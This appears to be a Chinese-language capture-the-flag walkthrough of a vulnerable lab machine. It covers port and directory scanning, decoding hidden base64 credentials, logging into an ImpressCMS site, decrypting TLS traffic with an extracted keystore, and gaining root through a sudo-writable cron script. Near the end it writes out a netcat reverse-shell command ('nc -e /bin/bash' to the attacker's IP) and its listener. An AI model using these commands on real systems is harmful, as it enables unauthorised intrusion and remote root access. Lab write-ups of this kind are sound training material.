## **1、信息收集**

### **1.1配置静态IP**

由于虚拟机配置的IP地址为静态IP，需要把攻击机配置在同网段

![](../Images/3bbc19093f669c197020fbf72a56f10f.png)

### 1.2 通过nmap进行端口扫描

```
nmap -A -sS -sV -v -p- 192.168.110.140
```

查看开放了几乎所有的端口

![](../Images/cbe0d333d430718e870d52d07401fae8.png)

## **2、渗透测试**

### **2.1 WEB渗透**

#### **1.使用nikto扫描站点**

```
nikto -host http://192.168.110.140
```

发现隐藏目录，访问目录后未发现有用信息

![](../Images/2fd41cfe1f8550a0672293a56b23ad9f.png)

#### **2.使用gobuster爆破目录**

使用gobuster进行爆破测试，只发现images目录和一个静态页面

```
gobuster dir -u http://192.168.110.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt
```

![](../Images/5af4374763fd7ea3174cbb49273f532a.png)

发现图片目录文件

![](../Images/011467bf4a9dedf7a2cba155e0aa9d35.png)

#### **3.首页访问测试**

访问首页，查看网页源代码，发现有一串隐藏信息

![](../Images/e71f05257183b7ca963a43171f9a698c.png)

通过base64进行2次解码获取到账号信息

```
echo "Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo" | base64 -d | base64 -d
```

![](../Images/2e0d4368c5eb918cc5f070e8b0d3873d.png)

#### **4.发现CMS站点**

通过点击首页图片，会自动跳转到CMS站点

![](../Images/576a24c0a60b259502e68c5026c21158.png)

通过Employee Portal页面发现登录页面，该站点CMS为`impresscms`

![](../Images/b2fd71afe19fb9bcf5164b8c1aee7852.png)

使用上面解码获取的账号密码登录成功

![](../Images/ad466a4c4ef742849d5221dd410c20b6.png)

#### **6.数据包解密**

查看数据包为SSL加密，访问的目的端口为8443

![](../Images/6b43b75d8b06d1193b68929087468156.png)

通过keystool修改密钥文件格式，将JKS格式转换为标准的PKCS12格式

```
keytool -importkeystore -srckeystore index.keystore -destkeystore keystore.p12 -deststoretype PKCS12
```

![](../Images/d232f809438aba64a12341c87a69a903.png)

在wireshark中设置SSL证书信息，选择编辑---选择首选项

![](../Images/dceac69bd0438e345352c2f05735c316.png)

在协议中选择TLS，选择编辑，配置IP、端口、证书路径、密码等信息

![](../Images/cbd4c2f3528f7130260a1ba80f217083.png)

追踪HTTP流信息查看到网站访问URL和用户登录认证信息

![](../Images/4edb1a8732d3a1e4405fe2b62c0f4410.png)

### **2.2 主机渗透**

#### **1.使用密码进行登录**

```
su - blumbergh
```

![](../Images/c9d4d0b04c0a73b39815272d10f84f37.png)

#### **2.查看当前用户的sudo权限**

```
sudo -l
```

![](../Images/88eae2ba8c924d8ed63a869c40f1d11f.png)

#### **3.查看执行脚本**

```
cat /usr/share/cleanup/tidyup.sh
```

定期每隔3分钟运行一次，保证不被黑客侵害

![](../Images/7b588af73e99dd069367ac6914c19749.png)

#### **4.设置反弹shell**

```
echo "nc -e /bin/bash 192.168.110.100 4433" > shell.txt
```

![](../Images/2211aa7d0bcfd1891d7841ca3070b011.png)

Kali中开启NC进行监听

```
nc -nlvp 4433
```

![](../Images/f5a8a2ecb9ba41522f1da16fb42e331a.png)

```

cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
```

![](../Images/18e822c4bf51db99bbfde6a09a331199.png)

获取到反弹shell

![](../Images/b3eaf872994cae119a0be67b426ae089.png)
